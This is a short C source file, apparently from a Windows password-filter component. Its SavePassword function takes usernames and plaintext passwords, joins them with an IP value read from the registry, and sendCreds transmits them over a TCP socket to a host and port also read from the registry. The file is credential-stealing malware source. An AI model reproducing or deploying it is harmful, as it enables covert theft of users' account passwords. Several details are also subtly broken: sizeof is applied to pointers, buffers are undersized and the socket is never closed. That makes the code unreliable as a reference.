#include "winfilter.h"

void sendCreds(char* creds)
{
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;

	char* ip = getIPReg("ipa");
	DWORD port = getPtReg();
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { return; } 

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) { return; }

	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) { return; }

	if (send(s, creds, strlen(creds), 0) < 0) { return; }

	return;
}

void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
{
	char* user = (char*)malloc(username->Length / 2);
	char* pass = (char*)malloc(password->Length / 2);
	char* creds = (char*)malloc((username->Length / 2) + (password->Length / 2) + 50);

	wcstombs(user, username->Buffer, sizeof(user));
	wcstombs(pass, password->Buffer, sizeof(pass));

	char* eip = getIPReg("eip");
	snprintf(creds, sizeof(creds), "%s\x11%s\x12%s\x13", user, pass, eip);
	free(eip);

	sendCreds(creds);

	free(creds);
}
